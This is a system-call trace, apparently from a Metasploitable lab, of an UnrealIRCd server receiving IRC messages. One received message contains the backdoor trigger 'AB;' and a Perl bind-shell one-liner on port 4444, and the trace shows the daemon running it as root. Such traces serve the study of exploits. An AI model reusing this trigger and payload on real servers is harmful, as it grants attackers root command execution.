4519  07:18:46.952706 select(1024, [2 3 4 7 9], [], NULL, {0, 980000}) = 1 (in [9], left {0, 810000})
4519  07:18:47.115721 clock_gettime(CLOCK_MONOTONIC, {1536, 932743557}) = 0
4519  07:18:47.115745 recv(9, "PRIVMSG  #testit3 BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 59
4519  07:18:47.115776 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.115795 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.115810 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.115825 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.115838 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.115852 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.115866 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.115922 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.115960 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.115990 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.116020 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.116033 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.116082 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.116099 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.116112 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.116165 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.116179 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.116193 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.116206 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.116235 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.116248 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.116262 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.116277 time(NULL)        = 1495624727
4519  07:18:47.116287 time(NULL)        = 1495624727
4519  07:18:47.116299 gettimeofday({1495624727, 116303}, NULL) = 0
4519  07:18:47.116310 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:18:47.116339 clock_gettime(CLOCK_MONOTONIC, {1536, 933351565}) = 0
4519  07:18:47.116349 gettimeofday({1495624727, 116352}, NULL) = 0
4519  07:18:47.116359 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {1, 0})
4519  07:18:47.117310 clock_gettime(CLOCK_MONOTONIC, {1536, 934324844}) = 0
4519  07:18:47.117324 accept(2, 0, NULL) = 5
4519  07:18:47.117343 getpeername(5, {sa_family=AF_INET, sin_port=htons(35387), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  07:18:47.117372 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:18:47.117384 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:18:47.117397 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  07:18:47.117409 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  07:18:47.117420 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  07:18:47.117431 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  07:18:47.117442 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  07:18:47.117458 clock_gettime(CLOCK_MONOTONIC, {1536, 934471384}) = 0
4519  07:18:47.117469 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  07:18:47.117481 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:18:47.117490 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:18:47.117499 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  07:18:47.117509 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  07:18:47.117525 send(6, ".T\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  07:18:47.117687 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  07:18:47.117745 gettimeofday({1495624727, 117749}, NULL) = 0
4519  07:18:47.117757 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {1, 0})
4519  07:18:47.123118 clock_gettime(CLOCK_MONOTONIC, {1536, 940135172}) = 0
4519  07:18:47.123154 recvfrom(6, ".T\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0\360\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  07:18:47.123211 close(6)          = 0
4519  07:18:47.123226 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  07:18:47.123240 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 174, 0) = 174
4519  07:18:47.123295 time(NULL)        = 1495624727
4519  07:18:47.123335 time(NULL)        = 1495624727
4519  07:18:47.123363 gettimeofday({1495624727, 123366}, NULL) = 0
4519  07:18:47.123389 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:18:47.123431 clock_gettime(CLOCK_MONOTONIC, {1536, 940458101}) = 0
4519  07:18:47.123508 gettimeofday({1495624727, 123514}, NULL) = 0
4519  07:18:47.123521 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [9], left {0, 410000})
4519  07:18:47.704891 clock_gettime(CLOCK_MONOTONIC, {1537, 521924880}) = 0
4519  07:18:47.704926 recv(9, "PRIVMSG  #testit3 ABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 45
4519  07:18:47.704950 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.704967 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.704981 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.704995 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.705008 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.705022 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.705035 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.705049 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.705062 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.705075 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.705088 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.705102 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.705115 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.705128 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.705141 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.705154 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.705167 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.705180 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.705194 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.705207 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.705221 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.705234 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.705265 gettimeofday({1495624727, 705270}, NULL) = 0
4519  07:18:47.705306 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  07:18:47.705363 clock_gettime(CLOCK_MONOTONIC, {1537, 522376420}) = 0
4519  07:18:47.705375 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  07:18:47.705409 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  07:18:47.705429 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  07:18:47.705441 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  07:18:47.705456 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 7442
7442  07:18:47.705522 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
7442  07:18:47.705536 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
7442  07:18:47.705547 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
7442  07:18:47.705560 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
7442  07:18:47.705666 brk(0)            = 0x80f9000
7442  07:18:47.705689 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7442  07:18:47.705706 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f2a000
7442  07:18:47.705722 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
7442  07:18:47.705739 open("/etc/ld.so.cache", O_RDONLY) = 1
7442  07:18:47.705760 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
7442  07:18:47.705810 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f22000
7442  07:18:47.705821 close(1)          = 0
7442  07:18:47.705849 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7442  07:18:47.705884 open("/lib/libncurses.so.5", O_RDONLY) = 1
7442  07:18:47.705896 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
7442  07:18:47.705989 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
7442  07:18:47.706006 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ef2000
7442  07:18:47.706018 mmap2(0xb7f1f000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7f1f000
7442  07:18:47.706035 close(1)          = 0
7442  07:18:47.706047 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7442  07:18:47.706061 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
7442  07:18:47.706075 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
7442  07:18:47.706166 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
7442  07:18:47.706183 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7eee000
7442  07:18:47.706195 mmap2(0xb7ef0000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7ef0000
7442  07:18:47.706210 close(1)          = 0
7442  07:18:47.706221 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7442  07:18:47.706234 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
7442  07:18:47.706248 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
7442  07:18:47.706464 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
7442  07:18:47.706481 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7eed000
7442  07:18:47.706495 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d9e000
7442  07:18:47.706505 mmap2(0xb7ee7000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7ee7000
7442  07:18:47.706520 mmap2(0xb7eea000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7eea000
7442  07:18:47.706533 close(1)          = 0
7442  07:18:47.706555 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d9d000
7442  07:18:47.706566 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d9d6b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
7442  07:18:47.706621 mprotect(0xb7ee7000, 4096, PROT_READ) = 0
7442  07:18:47.706656 munmap(0xb7f22000, 29913) = 0
7442  07:18:47.706681 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
7442  07:18:47.706695 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
7442  07:18:47.706715 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd30ef0) = -1 ENOTTY (Inappropriate ioctl for device)
7442  07:18:47.706745 brk(0)            = 0x80f9000
7442  07:18:47.706754 brk(0x80fa000)    = 0x80fa000
7442  07:18:47.706765 brk(0x80fb000)    = 0x80fb000
7442  07:18:47.706781 getuid32()        = 0
7442  07:18:47.706790 getgid32()        = 0
7442  07:18:47.706799 geteuid32()       = 0
7442  07:18:47.706807 getegid32()       = 0
7442  07:18:47.706828 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
7442  07:18:47.706875 time(NULL)        = 1495624727
7442  07:18:47.706887 brk(0x80fc000)    = 0x80fc000
7442  07:18:47.706919 brk(0x80fd000)    = 0x80fd000
7442  07:18:47.706938 open("/proc/meminfo", O_RDONLY) = 1
7442  07:18:47.706959 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
7442  07:18:47.706977 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f29000
7442  07:18:47.706988 read(1, "MemTotal:      1035240 kB\nMemFree:        556260 kB\nBuffers:         64772 kB\nCached:         257348 kB\nSwapCached:          0 kB\nActive:         254016 kB\nInactive:       197032 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        556020 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            4688 kB\nWriteback:           0 kB\nAnonPages:      128992 kB\nMapped:          52004 kB\nSlab:            16536 kB\nSReclaimable:     8360 kB\nSUnreclaim:       8176 kB\nPageTables:       1976 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635396 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
7442  07:18:47.707075 close(1)          = 0
7442  07:18:47.707086 munmap(0xb7f29000, 4096) = 0
7442  07:18:47.707098 brk(0x80fe000)    = 0x80fe000
7442  07:18:47.707123 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
7442  07:18:47.707136 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
7442  07:18:47.707148 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
7442  07:18:47.707160 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
7442  07:18:47.707172 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
7442  07:18:47.707183 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
7442  07:18:47.707197 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
7442  07:18:47.707208 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
7442  07:18:47.707221 uname({sys="Linux", node="metasploitable", ...}) = 0
7442  07:18:47.707268 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
7442  07:18:47.707285 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
7442  07:18:47.707303 brk(0x8100000)    = 0x8100000
7442  07:18:47.707314 getcwd("/etc/unreal", 4096) = 12
7442  07:18:47.707338 getpid()          = 7442
7442  07:18:47.707399 getppid()         = 4519
7442  07:18:47.707415 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
7442  07:18:47.707436 stat64("/sbin/sh", 0xbfd30ec8) = -1 ENOENT (No such file or directory)
7442  07:18:47.707449 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
7442  07:18:47.707480 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
7442  07:18:47.707504 socket(PF_FILE, SOCK_STREAM, 0) = 1
7442  07:18:47.707518 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
7442  07:18:47.707530 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
7442  07:18:47.707550 close(1)          = 0
7442  07:18:47.707562 socket(PF_FILE, SOCK_STREAM, 0) = 1
7442  07:18:47.707572 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
7442  07:18:47.707582 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
7442  07:18:47.707599 close(1)          = 0
7442  07:18:47.707612 open("/etc/nsswitch.conf", O_RDONLY) = 1
7442  07:18:47.707626 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
7442  07:18:47.707642 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f29000
7442  07:18:47.707653 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
7442  07:18:47.707704 read(1, "", 4096) = 0
7442  07:18:47.707714 close(1)          = 0
7442  07:18:47.707723 munmap(0xb7f29000, 4096) = 0
7442  07:18:47.707739 open("/etc/ld.so.cache", O_RDONLY) = 1
7442  07:18:47.707751 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
7442  07:18:47.707767 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f22000
7442  07:18:47.707777 close(1)          = 0
7442  07:18:47.707787 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7442  07:18:47.707801 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
7442  07:18:47.707823 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 